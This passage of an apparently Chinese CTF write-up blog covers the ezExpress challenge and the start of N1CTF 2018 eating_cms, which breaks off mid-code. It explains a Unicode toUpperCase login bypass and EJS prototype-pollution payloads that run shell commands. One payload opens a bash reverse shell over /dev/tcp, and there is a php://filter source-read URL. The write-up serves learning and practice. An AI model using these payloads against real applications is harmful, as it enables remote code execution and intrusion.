class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//index.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>(); <br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(a[attr]) &amp;&amp; <span class="hljs-title function_">isObject</span>(b[attr])) &#123;<br>      <span class="hljs-title function_">merge</span>(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">clone</span> = (<span class="hljs-params">a</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, a);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>&#125;);<br>&#125;);<br><br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>==req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>&amp;&amp;req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>==req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">passwd</span>)&#123;<br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">isLogin</span>=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><br><span class="hljs-comment">//app.js</span><br><span class="hljs-keyword">var</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> indexRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// view engine setup</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">disable</span>(<span class="hljs-string">&#x27;etag&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span><br>&#125;))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">logger</span>(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br><br><span class="hljs-comment">// catch 404 and forward to error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>&#125;);<br><br><span class="hljs-comment">// error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-comment">// set locals, only providing error in development</span><br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">message</span> = err.<span class="hljs-property">message</span>;<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">error</span> = req.<span class="hljs-property">app</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br><br>  <span class="hljs-comment">// render the error page</span><br>  res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure><p>注意<code>merge</code>和<code>clone</code>，初步判断是原型链污染。</p><p>先设置了这么个东西，匹配大小写的<code>admin</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br></code></pre></td></tr></table></figure><p>在注册时不让你注册<code>admin</code>用户名(大小写)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br></code></pre></td></tr></table></figure><p>但后面<code>/action</code>和<code>/info</code>路由限制只能<code>admin</code>用户才能操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure><p><code>clone</code>和<code>merge</code>这东西理解成深拷贝就行。</p><p>但注意这个<code>req.session.user</code>是怎么来的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>  <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>  <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>  <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>利用<code>toUpperCase()</code>函数对<code>userid</code>进行大写处理。其实这种转码很容易出现问题，比如对于拉丁文字母<code>ı</code>：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Welcome <span class="hljs-keyword">to</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Node</span>.</span></span>js v18.<span class="hljs-number">18.0</span>.<br>Type <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt; <span class="hljs-string">&quot;ı&quot;</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span><span class="hljs-operator"> == </span><span class="hljs-character">&#x27;I&#x27;</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>参考<code>https://blog.csdn.net/qq_45691294/article/details/109320437</code></p><p>所以注册个<code>admın</code>然后就能以<code>admin</code>身份登录。</p><p>登录之后能进<code>info</code>和<code>action</code>路由，注意<code>clone</code>和<code>render</code>函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br><br>req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br><br>res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br><br></code></pre></td></tr></table></figure><p><code>/info</code>路由会渲染这个并不存在的<code>outputFunctionName</code>属性，但并不知道这个东西和原型链污染能扯上啥关系。。网上的<code>payload</code>普遍是这么构造的，而且也没说原因(可能是太简单？)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br><br>&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/9001 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面翻了翻，来自<code>hardjs</code>这道题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">......<br>      prepended += <span class="hljs-string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">outputFunctionName</span>) &#123;<br>        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">_with</span> !== <span class="hljs-literal">false</span>) &#123;<br>        prepended +=  <span class="hljs-string">&#x27;  with (&#x27;</span> + opts.<span class="hljs-property">localsName</span> + <span class="hljs-string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        appended += <span class="hljs-string">&#x27;  &#125;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>......<br></code></pre></td></tr></table></figure><p>将<code>opts.outputFunctionName</code>拼接到了语句中，而上下文并未出现<code>outputFunctionName</code>这个属性，因此通过污染原型链来在此处进行<code>SSTI</code>，拼接的前面有一个<code>var</code>，而后面有一个<code>__append</code>，这就是<code>payload</code>前后拼接了奇怪内容的原因。</p><p>访问<code>/info</code>路由能看到自己构造的<code>payload</code>，不过这题好像不能出网了，反弹shell没法用：</p><p><img src="/img/ezexpresswhat.png" alt="ezexpresswhat"></p><p>参考<code>https://blog.z3ratu1.top/[GYCTF2020]ezExpress.html</code>，主要是对这个payload的解释：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>cat /flag &gt; /app/public/flag</code>这东西把<code>cat</code>命令输出的内容写到<code>/app/public/flag</code>下。</p><blockquote><p>输入不存在路由通过报错找到绝对路径，然后把flag写入public静态目录下面，访问直接&#x2F;flag下载下来</p><p>像python，JavaScript这类通过路由设置服务的方式和PHP访问对应文件就有一定的区别，设置了路由的情况下，就不会出现部分文件暴露在网站根目录被访问的情况，像PHP的话可以直接把flag写到网站根目录里面去直接访问获得，不过，他们也有对应的静态目录，静态目录下的文件就可以被直接访问，源码中app.js设置了静态目录<code>app.use(express.static(path.join(\_\_dirname, &#39;public&#39;)));</code>这个设置直接在静态目录下查找文件，因此访问时无需在url中添加public目录<br>所以public下的内容可以被直接访问，通过把flag写到静态目录下也可以直接访问获得</p></blockquote><p>最终payload:(我看有些师傅最后用<code>;var _tmp2</code>去闭合，我看不懂咋回事直接拿注释符把后面都注释掉了hh)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;)//&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p><code>register.php</code>随便注册一个账号，然后登录：</p><p>注意这个<code>URL</code>挺可疑的？<code>GET</code>方式给<code>page</code>传参：</p><p><img src="/img/n1ctfeatingcms1.png" alt="n1ctfeatingcms1"></p><p>伪协议看看能不能读<code>index.php</code>和<code>register.php</code>和<code>user.php</code>的源码(吗的我这里一开始在文件名后面加了<code>.php</code>后缀导致读不出来)：</p><p><code>user.php?page=php://filter/convert.base64-encode/resource=info</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//user.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span 